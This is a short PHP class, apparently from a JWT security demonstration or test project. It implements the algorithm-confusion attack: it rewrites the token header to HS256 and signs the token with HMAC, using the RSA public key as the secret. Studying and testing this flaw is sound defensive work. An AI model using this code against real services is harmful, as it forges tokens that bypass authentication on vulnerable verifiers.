<?php

namespace App\Attack;

use App\Alg;
use App\JWT;
use App\Keystore;
use App\Signer\HMAC;

class PublicKeyAsShared
{
    public static function attack(JWT $jwt): JWT
    {
        $jwt->headers['alg'] = Alg::HS256;

        return HMAC::sign($jwt->headers, $jwt->claims, Keystore::RSA_PUBLIC_KEY);
    }
}